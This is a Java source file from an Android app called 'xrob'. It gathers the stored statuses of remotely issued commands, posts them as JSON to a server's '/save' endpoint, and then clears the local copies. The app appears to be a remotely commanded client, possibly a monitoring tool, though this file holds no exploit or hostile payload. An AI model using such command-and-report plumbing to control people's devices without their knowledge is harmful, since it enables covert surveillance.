package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.theah64.xrob.database.CommandStatuses;
import com.theah64.xrob.models.Command;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.acra.ACRA;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 18/9/16.
 */
public class CommandStatusesSynchronizer extends BaseJSONPostNetworkAsyncTask<String, Void, Void> {


    private static final String X = CommandStatusesSynchronizer.class.getSimpleName();
    private static final String KEY_STATUS_HAPPENED_AT = "status_happened_at";

    public CommandStatusesSynchronizer(Context context) {
        super(context);
    }

    @Override
    protected Void doInBackground(String... strings) {

        Log.d(X, "Starting command status syncer...");

        final List<Command.Status> statusList = CommandStatuses.getInstance(getContext()).getAll();
        try {

            if (statusList != null) {

                final JSONArray jaStatuses = new JSONArray();

                //Converting list to jArray
                for (final Command.Status status : statusList) {
                    final JSONObject joStatus = new JSONObject();
                    joStatus.put(CommandStatuses.COLUMN_COMMAND_ID, status.getCommandId());
                    joStatus.put(CommandStatuses.COLUMN_STATUS, status.getStatus());
                    joStatus.put(CommandStatuses.COLUMN_STATUS_MESSAGE, status.getStatusMessage());
                    joStatus.put(KEY_STATUS_HAPPENED_AT, status.getStatusHappenedAt());

                    jaStatuses.put(joStatus);
                }

                Log.d(X, "How's this : " + jaStatuses);

                final Request commandSyncRequest = new APIRequestBuilder("/save", strings[0])
                        .addParam(Xrob.KEY_ERROR, "false")
                        .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_COMMAND_STATUSES)
                        .addParam(Xrob.KEY_MESSAGE, statusList.size() + " status(es) added")
                        .addParam(Xrob.KEY_DATA, jaStatuses.toString())
                        .build();

                OkHttpUtils.getInstance().getClient().newCall(commandSyncRequest).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(X, "Failed to sync command statuses");
                        e.printStackTrace();
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        try {
                            new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                            CommandStatuses.getInstance(getContext()).deleteAll();
                        } catch (JSONException | APIResponse.APIException e) {
                            e.printStackTrace();
                        }
                    }
                });

            }

        } catch (JSONException e) {
            e.printStackTrace();
            ACRA.getErrorReporter().handleException(e);
        }

        return null;
    }
}
